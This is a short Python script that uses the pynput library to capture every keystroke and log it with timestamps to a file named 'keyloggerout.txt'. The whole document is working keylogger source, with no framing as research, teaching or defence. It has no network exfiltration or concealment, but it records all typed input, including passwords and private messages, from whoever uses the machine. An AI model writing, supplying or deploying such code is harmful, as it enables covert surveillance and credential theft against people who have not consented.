from pynput.keyboard import Key, Listener 
import logging

log_files = ""

logging.basicConfig(filename = (log_files + "keyloggerout.txt"), level = logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
	logging.info(str(key))

with Listener(on_press=on_press) as listener:
	listener.join()